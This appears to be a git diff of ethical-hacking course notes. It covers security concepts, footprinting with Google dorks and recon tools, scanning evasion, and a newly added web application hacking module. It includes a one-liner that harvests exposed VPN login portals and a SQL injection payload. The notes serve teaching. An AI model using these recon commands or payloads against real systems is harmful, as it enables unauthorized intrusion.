@@ -6,17 +6,17 @@ Notes de cours par `Thomas Peugnet` assisté par Mistral AI.
 
 ### 1. Elements of Information Security
 
-- **Confidentiality**: Ensures that only authorized parties can access data.
-- **Integrity**: Guarantees that information is accurate and unaltered.
-- **Availability**: Ensures data and systems are accessible when needed.
-- **Authenticity**: Verifies the genuineness of users and data.
-- **Non-Repudiation**: Prevents parties from denying their actions or communications.
+- Confidentiality: Ensures that only authorized parties can access data.
+- Integrity: Guarantees that information is accurate and unaltered.
+- Availability: Ensures data and systems are accessible when needed.
+- Authenticity: Verifies the genuineness of users and data.
+- Non-Repudiation: Prevents parties from denying their actions or communications.
 
 ------
 
 ### 2. Tactics, Techniques, and Procedures (TTPs)
 
-- **Definition**: TTPs refer to the patterns of activities or methods associated with a specific threat actor or group, detailing how they plan and execute an attack.
+- Definition: TTPs refer to the patterns of activities or methods associated with a specific threat actor or group, detailing how they plan and execute an attack.
 
 ------
 
@@ -43,15 +43,15 @@ Notes de cours par `Thomas Peugnet` assisté par Mistral AI.
 
 ###### 3.3 Closing Attacks
 
-- **Definition**: Attempts to wrap up or finalize an attack phase, possibly erasing traces or leaving backdoors.
+- Definition: Attempts to wrap up or finalize an attack phase, possibly erasing traces or leaving backdoors.
 
 ###### 3.4 Insider Attacks
 
-- **Definition**: Attacks originating from within an organization by employees or trusted individuals.
+- Definition: Attacks originating from within an organization by employees or trusted individuals.
 
 ###### 3.5 Distribution Attacks
 
-- **Definition**: Attacks involving the distribution of malicious hardware or software (e.g., supply chain compromises).
+- Definition: Attacks involving the distribution of malicious hardware or software (e.g., supply chain compromises).
 
 ------
 
@@ -72,26 +72,26 @@ Notes de cours par `Thomas Peugnet` assisté par Mistral AI.
 
 ### 5. MITRE ATT&CK Framework
 
-- **Purpose**: A knowledge base of adversary tactics and techniques based on real-world observations.
+- Purpose: A knowledge base of adversary tactics and techniques based on real-world observations.
 
 ###### 5.1 Pre-Attack
 
-- **Recon**: Gathering information about the target.
-- **Weaponize**: Creating or customizing malicious payloads or exploits.
+- Recon: Gathering information about the target.
+- Weaponize: Creating or customizing malicious payloads or exploits.
 
 ###### 5.2 Enterprise Attack
 
-- **Deliver**: Sending the exploit or payload to the target (e.g., phishing).
-- **Exploit**: Triggering the vulnerability to gain initial access.
-- **Control**: Establishing command and control (C2) channels.
-- **Execute**: Running malicious code or commands on the compromised system.
-- **Maintain**: Ensuring continued access and persistence within the environment.
+- Deliver: Sending the exploit or payload to the target (e.g., phishing).
+- Exploit: Triggering the vulnerability to gain initial access.
+- Control: Establishing command and control (C2) channels.
+- Execute: Running malicious code or commands on the compromised system.
+- Maintain: Ensuring continued access and persistence within the environment.
 
 ------
 
 ### 6. Continual Adaptive Security Strategy
 
-- **Concept**: Continuous **prediction**, **prevention**, **detection**, and **response** to ensure comprehensive defense.
+- Concept: Continuous prediction, prevention, detection, and response to ensure comprehensive defense.
 
 ------
 
@@ -99,7 +99,7 @@ Notes de cours par `Thomas Peugnet` assisté par Mistral AI.
 
 A multi-layered approach where an attacker must penetrate each layer to reach the data:
 
-| **Layer**                           | **Description**                                              |
+| Layer                               | Description                                                  |
 | ----------------------------------- | ------------------------------------------------------------ |
 | Policies, Procedures, and Awareness | Security policies, training, and user awareness.             |
 | Physical                            | Locks, badges, security guards, physical barriers.           |
@@ -122,69 +122,69 @@ A multi-layered approach where an attacker must penetrate each layer to reach th
 
 ### 9. Risk Management
 
-1. **Risk Identification**: Recognize potential threats and vulnerabilities.
-2. **Risk Assessment**: Evaluate the likelihood and impact of each risk.
-3. **Risk Treatment**: Decide on measures to mitigate, transfer, accept, or avoid the risks.
-4. **Risk Tracking and Review**: Continuously monitor risks and reassess controls.
+1. Risk Identification: Recognize potential threats and vulnerabilities.
+2. Risk Assessment: Evaluate the likelihood and impact of each risk.
+3. Risk Treatment: Decide on measures to mitigate, transfer, accept, or avoid the risks.
+4. Risk Tracking and Review: Continuously monitor risks and reassess controls.
 
 ------
 
 ### 10. Types of Threat Intelligence
 
-- **Strategic Threat Intelligence**: High-level, long-term insights into overall threat landscape.
-- **Tactical Threat Intelligence**: Focused on immediate tactics and procedures used by attackers.
-- **Operational Threat Intelligence**: Real-time intelligence on specific attacks or campaigns.
-- **Technical Threat Intelligence**: Indicators of Compromise (IoCs) like IP addresses, domains, file hashes.
+- Strategic Threat Intelligence: High-level, long-term insights into overall threat landscape.
+- Tactical Threat Intelligence: Focused on immediate tactics and procedures used by attackers.
+- Operational Threat Intelligence: Real-time intelligence on specific attacks or campaigns.
+- Technical Threat Intelligence: Indicators of Compromise (IoCs) like IP addresses, domains, file hashes.
 
 ------
 
 ### 11. Threat Intelligence Lifecycle
 
-1. **Planning and Direction**: Define goals and requirements for intelligence.
-2. **Collection**: Gather data from internal and external sources.
-3. **Processing and Exploitation**: Clean, organize, and convert collected data for analysis.
-4. **Analysis and Production**: Interpret data to produce actionable intelligence.
-5. **Dissemination and Integration**: Share intelligence with relevant stakeholders and apply it.
+1. Planning and Direction: Define goals and requirements for intelligence.
+2. Collection: Gather data from internal and external sources.
+3. Processing and Exploitation: Clean, organize, and convert collected data for analysis.
+4. Analysis and Production: Interpret data to produce actionable intelligence.
+5. Dissemination and Integration: Share intelligence with relevant stakeholders and apply it.
 
 ------
 
 ### 12. Threat Modeling
 
-- **Definition**: Risk assessment approach to analyze application security by capturing and organizing information affecting security.
+- Definition: Risk assessment approach to analyze application security by capturing and organizing information affecting security.
 
-1. **Identify Security Objectives**
-2. **Application Overview**
+1. Identify Security Objectives
+2. Application Overview
    - Identify Roles
    - Identify Key Usage Scenarios
    - Identify Technologies
    - Identify Application Security Mechanisms
-3. **Decompose the Application**
+3. Decompose the Application
    - Identify Threat Boundaries
    - Identify Data Flows
    - Identify Entry Points
    - Identify Exit Points
-4. **Identify Threats**
-5. **Identify Vulnerabilities**
+4. Identify Threats
+5. Identify Vulnerabilities
 
 ------
 
 ### 13. Incident Handling and Response
 
-1. **Preparation**: Policies, training, and tools in place before an incident occurs.
-2. **Incident Recording and Assignment**: Document details and assign roles/responsibilities.
-3. **Incident Triage**: Prioritize incidents based on severity and impact.
-4. **Notification**: Inform stakeholders, management, or external parties as needed.
-5. **Containment**: Stop the spread of the incident and isolate affected systems.
-6. **Evidence Gathering and Forensic Analysis**: Collect data for analysis and potential legal action.
-7. **Eradication**: Remove malware, close vulnerabilities, and eliminate root causes.
-8. **Recovery**: Restore systems and services to normal operation.
-9. **Post-Incident Activities**: Lessons learned, documentation, and improvements to defenses.
+1. Preparation: Policies, training, and tools in place before an incident occurs.
+2. Incident Recording and Assignment: Document details and assign roles/responsibilities.
+3. Incident Triage: Prioritize incidents based on severity and impact.
+4. Notification: Inform stakeholders, management, or external parties as needed.
+5. Containment: Stop the spread of the incident and isolate affected systems.
+6. Evidence Gathering and Forensic Analysis: Collect data for analysis and potential legal action.
+7. Eradication: Remove malware, close vulnerabilities, and eliminate root causes.
+8. Recovery: Restore systems and services to normal operation.
+9. Post-Incident Activities: Lessons learned, documentation, and improvements to defenses.
 
 ------
 
 ### 14. Machine Learning in Cybersecurity
 
-**Key Areas of Use**
+Key Areas of Use
 
 - Password Protection and Authentication
 - Phishing Detection and Prevention
@@ -205,33 +205,33 @@ A multi-layered approach where an attacker must penetrate each layer to reach th
 
 Below is a brief overview of each regulation and its main focus:
 
-| **Name**                                            | **Acronym** | **Purpose / Focus**                                          |
-| --------------------------------------------------- | ----------- | ------------------------------------------------------------ |
-| Payment Card Industry Data Security Standard        | PCI DSS     | Protects cardholder data through security controls and regular assessments. |
-| ISO/IEC Standards (e.g., ISO/IEC 27001)             | ISO/IEC     | Provides guidelines and requirements for an information security management system (ISMS). |
-| Health Insurance Portability and Accountability Act | HIPAA       | Secures and protects healthcare information and patient privacy in the U.S. |
-| Sarbanes-Oxley Act                                  | SOX         | Ensures accurate financial reporting and corporate accountability for public companies in the U.S. |
-| Digital Millennium Copyright Act                    | DMCA        | Protects copyright holders’ rights in the digital environment and addresses anti-circumvention of access controls. |
-| Federal Information Security Management Act         | FISMA       | Requires federal agencies in the U.S. to develop, document, and implement information security programs. |
-| General Data Protection Regulation                  | GDPR        | Regulates data protection and privacy for individuals within the EU; establishes strict data handling and breach notification rules. |
-| Data Protection Act 2018                            | DPA         | UK-specific data protection legislation implementing and supplementing GDPR requirements. |
+| Name                                                | Acronym | Purpose / Focus                                              |
+| --------------------------------------------------- | ------- | ------------------------------------------------------------ |
+| Payment Card Industry Data Security Standard        | PCI DSS | Protects cardholder data through security controls and regular assessments. |
+| ISO/IEC Standards (e.g., ISO/IEC 27001)             | ISO/IEC | Provides guidelines and requirements for an information security management system (ISMS). |
+| Health Insurance Portability and Accountability Act | HIPAA   | Secures and protects healthcare information and patient privacy in the U.S. |
+| Sarbanes-Oxley Act                                  | SOX     | Ensures accurate financial reporting and corporate accountability for public companies in the U.S. |
+| Digital Millennium Copyright Act                    | DMCA    | Protects copyright holders’ rights in the digital environment and addresses anti-circumvention of access controls. |
+| Federal Information Security Management Act         | FISMA   | Requires federal agencies in the U.S. to develop, document, and implement information security programs. |
+| General Data Protection Regulation                  | GDPR    | Regulates data protection and privacy for individuals within the EU; establishes strict data handling and breach notification rules. |
+| Data Protection Act 2018                            | DPA     | UK-specific data protection legislation implementing and supplementing GDPR requirements. |
 
 ## Module 02 - Footprinting
 
 ### 1. Passive vs. Active Footprinting
 
-- **Passive Footprinting**: Gathering information without directly interacting with the target (e.g., public websites, social media, open-source resources).
-- **Active Footprinting**: Direct engagement with the target’s systems or networks (e.g., port scans, ping sweeps).
+- Passive Footprinting: Gathering information without directly interacting with the target (e.g., public websites, social media, open-source resources).
+- Active Footprinting: Direct engagement with the target’s systems or networks (e.g., port scans, ping sweeps).
 
 ---
 
 ### 2. Information Obtained in Footprinting
 
-- **Organization Information**: Company structure, employee names, addresses.
-- **Network Information**: IP ranges, DNS details, connectivity methods.
-- **System Information**: OS versions, server types, technology stacks.
+- Organization Information: Company structure, employee names, addresses.
+- Network Information: IP ranges, DNS details, connectivity methods.
+- System Information: OS versions, server types, technology stacks.
 
-> **Note**: Remember to check **page 10** of the module for the “Footprinting Techniques” table/graphic.
+> Note: Remember to check page 10 of the module for the “Footprinting Techniques” table/graphic.
 
 ---
 
@@ -241,49 +241,49 @@ Below is a brief overview of each regulation and its main focus:
 
 Below is a table of 30 commonly used Google operators (Google Dorks). These can help refine searches and find specific information about a target.
 
-| Operator               | Syntax Example                  | Description                                                  |
-| ---------------------- | ------------------------------- | ------------------------------------------------------------ |
-| **1. site:**           | `site:example.com`              | Returns results only from the specified domain.              |
-| **2. intitle:**        | `intitle:"login page"`          | Returns pages with the specified phrase in the HTML title.   |
-| **3. allintitle:**     | `allintitle:admin site:gov`     | Returns pages where all keywords are in the title.           |
-| **4. inurl:**          | `inurl:admin`                   | Returns pages with the specified keyword in the URL.         |
-| **5. allinurl:**       | `allinurl:login.asp`            | Returns pages where all keywords are in the URL.             |
-| **6. filetype:**       | `filetype:pdf "internal memo"`  | Returns files of a specific type containing the keywords.    |
-| **7. link:**           | `link:example.com`              | Returns pages that link to the specified domain or URL.      |
-| **8. related:**        | `related:example.com`           | Returns pages related to the specified domain or URL.        |
-| **9. cache:**          | `cache:example.com`             | Shows the Google-cached version of the page.                 |
-| **10. before:**        | `before:2020 "product launch"`  | Shows results published or updated before a specific year.   |
-| **11. after:**         | `after:2021 "policy update"`    | Shows results published or updated after a specific year.    |
-| **12. inanchor:**      | `inanchor:"click here"`         | Searches for pages with specified text in anchor links.      |
-| **13. allinanchor**    | `allinanchor:"web login"`       | Searches for pages where all keywords appear in anchor text. |
-| **14. intext:**        | `intext:"error message"`        | Searches for pages containing the specified text in the body. |
-| **15. allintext:**     | `allintext:"username password"` | Searches where all words appear in the text body.            |
-| **16. around(X)**      | `"admin" AROUND(5) "login"`     | Searches for terms within X words of each other.             |
-| **17. "exact phrase"** | `"login portal"`                | Searches for the exact phrase in quotes.                     |
-| **18. OR**             | `admin OR administrator`        | Combines multiple search terms; either may appear.           |
-| **19. AND**            | `admin AND filetype:txt`        | Narrows search to results including both terms.              |
-| **20. - (minus)**      | `login -wordpress`              | Excludes results containing the specified term.              |
-| **21. + (plus)**       | `+pdf +internal`                | Ensures terms are included in results (less common today).   |
-| **22. info:**          | `info:example.com`              | Provides information about the specified domain.             |
-| **23. define:**        | `define:spear phishing`         | Displays Google’s definition of a term (varies by region).   |
-| **24. map:**           | `map:"San Francisco"`           | Shows map results for a location (in some regions).          |
-| **25. phonebook:**     | `phonebook:"John Doe"`          | (Deprecated) Used to look up phone listings.                 |
-| **26. weather:**       | `weather:New York`              | Shows weather for a specific location.                       |
-| **27. stocks:**        | `stocks:GOOG`                   | Returns stock information (in some regions).                 |
-| **28. cacheurl:**      | `cacheurl:example.com`          | Alternate syntax to view cached pages.                       |
-| **29. inposttitle:**   | `inposttitle:"vulnerability"`   | Searches in the post titles of forums or blog platforms (older). |
-| **30. blogurl:**       | `blogurl:example.com`           | Might return blog URLs associated with a domain (less common usage). |
+| Operator           | Syntax Example                  | Description                                                  |
+| ------------------ | ------------------------------- | ------------------------------------------------------------ |
+| 1. site:           | `site:example.com`              | Returns results only from the specified domain.              |
+| 2. intitle:        | `intitle:"login page"`          | Returns pages with the specified phrase in the HTML title.   |
+| 3. allintitle:     | `allintitle:admin site:gov`     | Returns pages where all keywords are in the title.           |
+| 4. inurl:          | `inurl:admin`                   | Returns pages with the specified keyword in the URL.         |
+| 5. allinurl:       | `allinurl:login.asp`            | Returns pages where all keywords are in the URL.             |
+| 6. filetype:       | `filetype:pdf "internal memo"`  | Returns files of a specific type containing the keywords.    |
+| 7. link:           | `link:example.com`              | Returns pages that link to the specified domain or URL.      |
+| 8. related:        | `related:example.com`           | Returns pages related to the specified domain or URL.        |
+| 9. cache:          | `cache:example.com`             | Shows the Google-cached version of the page.                 |
+| 10. before:        | `before:2020 "product launch"`  | Shows results published or updated before a specific year.   |
+| 11. after:         | `after:2021 "policy update"`    | Shows results published or updated after a specific year.    |
+| 12. inanchor:      | `inanchor:"click here"`         | Searches for pages with specified text in anchor links.      |
+| 13. allinanchor    | `allinanchor:"web login"`       | Searches for pages where all keywords appear in anchor text. |
+| 14. intext:        | `intext:"error message"`        | Searches for pages containing the specified text in the body. |
+| 15. allintext:     | `allintext:"username password"` | Searches where all words appear in the text body.            |
+| 16. around(X)      | `"admin" AROUND(5) "login"`     | Searches for terms within X words of each other.             |
+| 17. "exact phrase" | `"login portal"`                | Searches for the exact phrase in quotes.                     |
+| 18. OR             | `admin OR administrator`        | Combines multiple search terms; either may appear.           |
+| 19. AND            | `admin AND filetype:txt`        | Narrows search to results including both terms.              |
+| 20. - (minus)      | `login -wordpress`              | Excludes results containing the specified term.              |
+| 21. + (plus)       | `+pdf +internal`                | Ensures terms are included in results (less common today).   |
+| 22. info:          | `info:example.com`              | Provides information about the specified domain.             |
+| 23. define:        | `define:spear phishing`         | Displays Google’s definition of a term (varies by region).   |
+| 24. map:           | `map:"San Francisco"`           | Shows map results for a location (in some regions).          |
+| 25. phonebook:     | `phonebook:"John Doe"`          | (Deprecated) Used to look up phone listings.                 |
+| 26. weather:       | `weather:New York`              | Shows weather for a specific location.                       |
+| 27. stocks:        | `stocks:GOOG`                   | Returns stock information (in some regions).                 |
+| 28. cacheurl:      | `cacheurl:example.com`          | Alternate syntax to view cached pages.                       |
+| 29. inposttitle:   | `inposttitle:"vulnerability"`   | Searches in the post titles of forums or blog platforms (older). |
+| 30. blogurl:       | `blogurl:example.com`           | Might return blog URLs associated with a domain (less common usage). |
 
 ---
 
 #### 3.2 Lynx (Command-Line Web Browser)
 
-- **Purpose**: Text-based browsing; ideal for scripting and automation.
-- **Basic Use**:  
+- Purpose: Text-based browsing; ideal for scripting and automation.
+- Basic Use:  
   - `lynx https://example.com` (interactive mode: arrow keys to navigate, `q` to quit).
   - `lynx --dump https://example.com` (outputs page text and URLs to terminal).
 
-**Recon Example**  
+Recon Example  
 
 ```bash
 lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR+fortigate+OR+%22ss1+vpn%22" \
@@ -292,20 +292,20 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 | grep -o "http[^&]*"
 ```
 
-1. **lynx --dump**: Fetches Google search results for `inurl:"remote login"` + Fortinet/Fortigate/“ss1 vpn”.
-2. **grep "http"**: Filters lines containing `http`.
-3. **cut -d "=" -f2**: Splits each line on `=` and selects the second field.
-4. **grep -o "http[^&]\*"**: Extracts clean URLs.
+1. lynx --dump: Fetches Google search results for `inurl:"remote login"` + Fortinet/Fortigate/“ss1 vpn”.
+2. grep "http": Filters lines containing `http`.
+3. cut -d "=" -f2: Splits each line on `=` and selects the second field.
+4. grep -o "http[^&]\*": Extracts clean URLs.
 
 ---
 
 #### 3.3 Google Hacking Database (GHDB)
 
 - Contains a collection of Google search queries (“dorks”) that reveal:
-  - **Sensitive files** (e.g., configuration files, backup files).
-  - **Exposed directories** (like `/admin/`, `/backup/`).
-  - **Error messages** that may expose system paths or technologies.
-  - **Vulnerable devices** (e.g., exposed webcams, printers).
+  - Sensitive files (e.g., configuration files, backup files).
+  - Exposed directories (like `/admin/`, `/backup/`).
+  - Error messages that may expose system paths or technologies.
+  - Vulnerable devices (e.g., exposed webcams, printers).
 - Can also be leveraged to find captive VPN or FTP portals through specialized dorks.
 
 ---
@@ -319,8 +319,8 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 
 #### 3.5 Netcraft and DNSDumpster
 
-- **Netcraft**: Gathers information about hosting providers, subdomains, technologies in use.
-- **DNSDumpster**: Visual mapper of DNS records and subdomains of a domain.
+- Netcraft: Gathers information about hosting providers, subdomains, technologies in use.
+- DNSDumpster: Visual mapper of DNS records and subdomains of a domain.
 
 ---
 
@@ -328,13 +328,13 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 
 #### 4.1 Cheat Sheet: `dig`
 
-- **Basic query**:  
+- Basic query:  
   - `dig example.com` – Default query for A record.
-- **Specify DNS record**:  
+- Specify DNS record:  
   - `dig example.com MX` – Queries the MX records.
-- **Reverse lookup**:  
+- Reverse lookup:  
   - `dig -x 8.8.8.8` – Finds the domain associated with an IP address.
-- **Specify DNS server**:  
+- Specify DNS server:  
   - `dig @8.8.8.8 example.com` – Uses Google’s public DNS server.
 
 #### 4.2 Blist3r
@@ -353,8 +353,8 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 
 ### 5. Dark Web Footprinting
 
-- Using **DuckDuckGo** as a Tor-friendly search engine.
-- **DuckDuckDorks**: Similar to Google Dorks but focusing on `.onion` sites.
+- Using DuckDuckGo as a Tor-friendly search engine.
+- DuckDuckDorks: Similar to Google Dorks but focusing on `.onion` sites.
   - Example: Searching for leaked credentials, hidden services, or private forums.
   - Syntax is less standardized than Google Dorks; often uses keywords plus `site:.onion`.
 
@@ -362,8 +362,8 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 
 ### 6. Google Finance and Google Alerts
 
-- **Google Finance**: Provides financial information about publicly traded companies (stock prices, historical data).
-- **Google Alerts**: Sends email notifications when new results appear for specific keywords (e.g., company name, product, or competitor).
+- Google Finance: Provides financial information about publicly traded companies (stock prices, historical data).
+- Google Alerts: Sends email notifications when new results appear for specific keywords (e.g., company name, product, or competitor).
 
 ---
 
@@ -372,7 +372,7 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 #### 7.1 TheHarvester
 
 - A tool used to find email addresses and subdomains from different public sources (including LinkedIn).
-- **Examples**:
+- Examples:
   - `theharvester -d microsoft.com -l 200 -b linkedin`  
     Collects data from LinkedIn for the domain `microsoft.com`.
   - `theharvester -d example.com -l 100 -b all`  
@@ -380,9 +380,9 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 
 #### 7.2 BuzzSumo, Sherlock, SocialSearcher.com
 
-- **BuzzSumo**: Discovers popular content and influencer information.  
-- **Sherlock**: Finds usernames across multiple social networks.  
-- **SocialSearcher.com**: Searches across various social media platforms for real-time mentions.
+- BuzzSumo: Discovers popular content and influencer information.  
+- Sherlock: Finds usernames across multiple social networks.  
+- SocialSearcher.com: Searches across various social media platforms for real-time mentions.
 
 ---
 
@@ -390,9 +390,9 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 
 - Reveals domain registrant details (organization name, address, creation/expiration dates).
 - May provide:
-  - **Registrar** info,
-  - **Contact** info (email/phone),
-  - **Nameservers** used,
+  - Registrar info,
+  - Contact info (email/phone),
+  - Nameservers used,
   - etc.
 
 ---
@@ -403,21 +403,21 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 
 | Record Type | Purpose                                             |
 | ----------- | --------------------------------------------------- |
-| **A**       | Maps a hostname to an IPv4 address                  |
-| **AAAA**    | Maps a hostname to an IPv6 address                  |
-| **MX**      | Mail Exchange record for email routing              |
-| **NS**      | Nameserver record, indicates DNS servers for domain |
-| **CNAME**   | Canonical name, alias for another domain name       |
-| **SOA**     | Start of Authority, primary DNS server info         |
-| **SRV**     | Service record for specific services (e.g., SIP)    |
-| **PTR**     | Pointer record for reverse DNS lookups              |
-| **RP**      | Responsible Person record (contact info)            |
-| **HINFO**   | Host info (CPU/OS type) – often deprecated          |
-| **TXT**     | Text record (SPF, DMARC, or other arbitrary data)   |
+| A           | Maps a hostname to an IPv4 address                  |
+| AAAA        | Maps a hostname to an IPv6 address                  |
+| MX          | Mail Exchange record for email routing              |
+| NS          | Nameserver record, indicates DNS servers for domain |
+| CNAME       | Canonical name, alias for another domain name       |
+| SOA         | Start of Authority, primary DNS server info         |
+| SRV         | Service record for specific services (e.g., SIP)    |
+| PTR         | Pointer record for reverse DNS lookups              |
+| RP          | Responsible Person record (contact info)            |
+| HINFO       | Host info (CPU/OS type) – often deprecated          |
+| TXT         | Text record (SPF, DMARC, or other arbitrary data)   |
 
 #### 9.2 Tools: SecurityTrails, FIRC
 
-- **SecurityTrails**: Offers historical DNS data, subdomain enumeration, IP information.
+- SecurityTrails: Offers historical DNS data, subdomain enumeration, IP information.
   - Example usage: Searching historical records for `example.com`.
 
 ---
@@ -426,9 +426,9 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 
 #### 10.1 Traceroute (TCP & UDP)
 
-- **Default Traceroute (UDP)**:
+- Default Traceroute (UDP):
   - `traceroute example.com` – Sends UDP packets, increments TTL to map hops.
-- **TCP Traceroute**:
+- TCP Traceroute:
   - `tcptraceroute example.com 80` – Uses TCP packets on port 80 to bypass some firewalls.
 
 #### 10.2 PingPlotter
@@ -443,25 +443,25 @@ lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR
 
 Common details in an email header:
 
-- **From/To/CC**: Sender and recipient email addresses.
-- **Date/Subject**: Timestamp and email subject.
-- **Message-ID**: Unique identifier for the email.
-- **Received**: Shows the email’s path through mail servers (IP addresses, timestamps).
-- **Content-Type**: Format of the email (text/html, etc.).
+- From/To/CC: Sender and recipient email addresses.
+- Date/Subject: Timestamp and email subject.
+- Message-ID: Unique identifier for the email.
+- Received: Shows the email’s path through mail servers (IP addresses, timestamps).
+- Content-Type: Format of the email (text/html, etc.).
 
 #### 11.2 Tools
 
-- **Email Tracker Pro**: Tracks if/when emails are opened, recipient location, etc.
-- **IP to Location**: Converts IP addresses found in headers to approximate geographic locations.
+- Email Tracker Pro: Tracks if/when emails are opened, recipient location, etc.
+- IP to Location: Converts IP addresses found in headers to approximate geographic locations.
 
 ---
 
 ### 12. Physical / Social Engineering Footprinting
 
-1. **Eavesdropping**: Listening to conversations or network traffic (e.g., open Wi-Fi).
-2. **Shoulder Surfing**: Observing someone’s screen or keyboard to capture sensitive info.
-3. **Dumpster Diving**: Retrieving documents or hardware from trash/recycling to find confidential data.
-4. **Impersonation**: Pretending to be someone else (e.g., an employee, partner) to gain information or access.
+1. Eavesdropping: Listening to conversations or network traffic (e.g., open Wi-Fi).
+2. Shoulder Surfing: Observing someone’s screen or keyboard to capture sensitive info.
+3. Dumpster Diving: Retrieving documents or hardware from trash/recycling to find confidential data.
+4. Impersonation: Pretending to be someone else (e.g., an employee, partner) to gain information or access.
 
 ## Module 03 - Network Scanning
 
@@ -666,7 +666,7 @@ Nmap can detect the OS of a target by analyzing TCP/IP stack behavior (e.g., TCP
 
 Various evasion or stealth techniques exist:
 
-1. **Packet Fragmentation**
+1. Packet Fragmentation
 
    - Sends tiny fragments to bypass simple signature-based IDS/IPS.
 
@@ -674,7 +674,7 @@ Various evasion or stealth techniques exist:
 
    - > Countermeasure: Use reassembly at the perimeter (IDS/IPS that handles fragmented packets properly).
 
-2. **Source Routing**
+2. Source Routing
 
    - Embeds route information in packets to bypass certain network paths.
 
@@ -684,7 +684,7 @@ Various evasion or stealth techniques exist:
 
    - > Countermeasure: Disable source routing on routers and hosts.
 
-3. **Source Port Manipulation**
+3. Source Port Manipulation
 
    - Sets a common trusted port (e.g., 53 for DNS) to bypass firewall rules.
 
@@ -692,7 +692,7 @@ Various evasion or stealth techniques exist:
 
    - > Countermeasure: Proper egress filtering and deep packet inspection to detect anomalies.
 
-4. **IP Address Decoy**
+4. IP Address Decoy
 
    - Makes it appear that multiple decoy IPs are scanning the target along with your real IP.
 
@@ -700,7 +700,7 @@ Various evasion or stealth techniques exist:
 
    - > Countermeasure: Correlate timing and packet patterns to see which host is the real scanner.
 
-5. **IP Address Spoofing**
+5. IP Address Spoofing
 
    - Fake source IP so replies go elsewhere (usually you can’t see open ports unless you receive the replies).
 
@@ -708,7 +708,7 @@ Various evasion or stealth techniques exist:
 
    - > Countermeasure: Ingress filtering (RFC 2827), block private IPs at the perimeter.
 
-6. **MAC Address Spoofing**
+6. MAC Address Spoofing
 
    - Changes the MAC address of your interface to bypass certain network filters or log correlation.
 
@@ -722,7 +722,7 @@ Various evasion or stealth techniques exist:
 
    - > Countermeasure: Port security on switches (e.g., sticky MAC) or use 802.1X.
 
-7. **Creating Custom Packets**
+7. Creating Custom Packets
 
    - Tools like hping3 let you craft packets with arbitrary flags, sequence numbers, etc.
 
@@ -734,7 +734,7 @@ Various evasion or stealth techniques exist:
 
    - Countermeasure: Deep packet inspection, robust IPS.
 
-8. **Randomizing Host Order**
+8. Randomizing Host Order
 
    - Avoid scanning IP addresses in ascending order to look less suspicious.
 
@@ -742,7 +742,7 @@ Various evasion or stealth techniques exist:
 
    - > Countermeasure: Statistical traffic analysis to detect unusual patterns.
 
-9. **Sending Bad Checksums**
+9. Sending Bad Checksums
 
    - Some IDS/IPS might ignore packets with invalid checksums, but the target OS may still process them.
 
@@ -750,7 +750,7 @@ Various evasion or stealth techniques exist:
 
    - > Countermeasure: Proper normalization at the firewall or IDS that re-checks checksums and discards invalid packets.
 
-10. **Proxy Servers and Anonymizers**
+10. Proxy Servers and Anonymizers
 
     - Use a chain of proxies, VPNs, or anonymity networks (e.g., Tor, Tails) to hide the true source of scans.
 
@@ -1178,7 +1178,7 @@ Main Types
 
 #### 2.3 Other In-Band Variants
 
-- **End-of-Line Commands** (`--`, `#`):
+- End-of-Line Commands (`--`, `#`):
 
   ```sql
   ' OR '1'='1' -- 
@@ -1610,6 +1610,235 @@ Short explanation + example:
   - Regular Audits and code reviews
   - Keep software patched and updated
 
+## Module 14 - Hacking Web Applications
+
+### 1. Overview of Web Application Hacking
+
+- Definition
+  - Exploiting weaknesses in web applications to gain unauthorized access, manipulate data, or disrupt service.
+- Key Concepts
+  - Client-Server Model: Typically browser (client) communicating with a web server.
+  - HTTP/S: Stateless protocol, leading to potential session management flaws.
+  - Common Attack Surfaces: Input forms, cookies, headers, query parameters, APIs.
+
+------
+
+### 2. Web Application Threats & Attack Vectors
+
+#### 2.1 OWASP Top 10 Overview
+
+- A1: Broken Access Control
+  - Improperly enforced access to pages/resources (e.g., forced browsing).
+- A2: Cryptographic Failures
+  - Weak or missing encryption, insecure protocols.
+- A3: Injection
+  - Includes SQL, LDAP, or OS command injection.
+- A4: Insecure Design
+  - Flaws in the logic or architecture of the app.
+- A5: Security Misconfiguration
+  - Unpatched systems, default credentials, misconfigured servers.
+- A6: Vulnerable and Outdated Components
+  - Using libraries/frameworks with known exploits.
+- A7: Identification and Authentication Failures
+  - Weak session IDs, credential stuffing, brute force attacks.
+- A8: Software and Data Integrity Failures
+  - Application code or infrastructure not verified (e.g., CI/CD pipeline issues).
+- A9: Security Logging and Monitoring Failures
+  - Poor logging, detection, and response capabilities.
+- A10: Server-Side Request Forgery (SSRF)
+  - Application fetching remote resources without validating user input.
+
+#### 2.2 Additional Common Vulnerabilities
+
+- Cross-Site Scripting (XSS)
+  - Injecting malicious scripts into trusted sites.
+  - Types: Stored, Reflected, DOM-based.
+- Cross-Site Request Forgery (CSRF)
+  - Tricking a user’s browser into sending unauthorized requests.
+- Directory Traversal
+  - Accessing files/folders outside the intended web root via `../` sequences.
+- File Inclusion (LFI/RFI)
+  - Including local or remote files via user-controllable paths.
+- Session Hijacking
+  - Stealing or predicting session IDs to impersonate a user.
+
+------
+
+### 3. Web Application Hacking Methodology
+
+1. Reconnaissance
+   - Gather info about target: subdomains, server type, framework, etc.
+   - Tools: Google Dorks, WHOIS, Netcraft, Shodan.
+2. Scanning & Enumeration
+   - Identify open ports/services, technology stack, hidden directories.
+   - Tools: Nmap, Burp Suite (Scanner), Nikto.
+3. Exploitation
+   - Inject malicious payloads: XSS, SQLi, Command Injection, etc.
+   - Test for insecure configurations: default credentials, unprotected admin panels.
+4. Post-Exploitation
+   - Maintain access (web shells, backdoors).
